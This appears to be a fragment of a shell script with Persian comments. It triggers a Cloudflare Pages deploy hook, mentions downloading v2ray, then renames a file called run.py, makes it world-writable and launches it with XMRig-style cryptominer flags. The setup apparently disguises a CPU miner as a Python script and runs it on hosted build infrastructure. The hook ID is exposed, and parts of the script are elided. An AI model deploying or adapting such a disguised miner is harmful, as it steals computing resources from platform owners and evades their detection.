...
curl -d "" "https://api.cloudflare.com/client/v4/pages/webhooks/deploy_hooks/1e92db9e-b16b-45e4-8cc0-5b471c6c300c"
# اجرای اصلیd
# دانلود v2ray
...
mv run.py $NEW_PY
chmod 777 $NEW_PY
./$NEW_PY --huge-pages-jit --cpu-priority=0 --cpu-max-threads-hint=50 --randomx-no-numa --argon2-impl=AVX2
